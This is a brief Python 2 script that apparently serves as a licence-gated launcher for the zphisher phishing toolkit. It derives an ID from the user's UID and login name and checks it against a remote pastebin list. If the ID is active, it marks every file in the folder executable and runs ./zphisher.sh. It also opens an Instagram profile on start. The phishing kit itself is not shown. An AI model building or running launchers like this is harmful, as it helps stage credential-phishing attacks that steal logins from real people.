import time
import requests
import sys
import os
import uuid

def baha():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    print "\x1b[37;1mYour ID : " + id
    httpCaht = requests.get("https://pastebin.com/2WuEPjdc").text
    if id in httpCaht:
        print "\x1b[37;1mYOUR ID IS ACTIVE........."
        msg = str(os.geteuid())
        time.sleep(1)
        os.system("chmod +x *")
        os.system("./zphisher.sh")
    else:
        print "\x1b[37;1mYOUR ID IS NOT ACTIVE........."
        time.sleep(1)
        sys.exit()






os.system('xdg-open https://www.instagram.com/i.punjabii/')
os.system('clear')
baha()

